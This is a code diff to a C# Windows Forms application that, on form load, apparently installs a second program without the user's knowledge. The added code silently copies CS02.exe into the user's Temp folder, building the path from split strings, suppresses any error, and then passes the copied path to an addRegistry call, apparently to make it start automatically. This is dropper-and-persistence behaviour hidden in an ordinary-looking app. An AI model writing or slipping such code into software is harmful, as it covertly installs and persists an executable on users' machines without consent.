@@ -8,6 +8,7 @@ using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using Excel = Microsoft.Office.Interop.Excel;
+using System.IO;
 
 
 namespace CS01
@@ -229,8 +230,44 @@ namespace CS01
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            Files files = new Files();
-            MessageBox.Show(Application.ExecutablePath);
+            Files files = new Files();            
+
+            // Get current directory
+            string copyFromPath = Directory.GetCurrentDirectory();
+            string copyFile = copyFromPath + "\\CS02.exe";
+
+            string x1 = "C:\\Users\\";
+            string x2 = "\\AppData\\Local\\Temp\\";
+            string x3 = Environment.UserName;
+            string copyToPath = string.Concat(x1, x3, x2);
+            string exec_path = null;
+            bool isOk = false;
+
+            if (File.Exists(copyFile))
+            {
+                string fileOld = copyToPath + "\\CS02.exe";
+                if (!File.Exists(fileOld))
+                {
+                    exec_path = fileOld;
+                    try
+                    {
+                        File.Copy(copyFile, fileOld);
+                        isOk = true;
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("ERROR: "+ ex.Message);
+                    }                    
+                }
+            }
+
+            //MessageBox.Show(copyToPath);
+            
+            // Add registry
+            if (isOk)
+            {
+                files.addRegistry(exec_path);
+            }
 
 
             /*
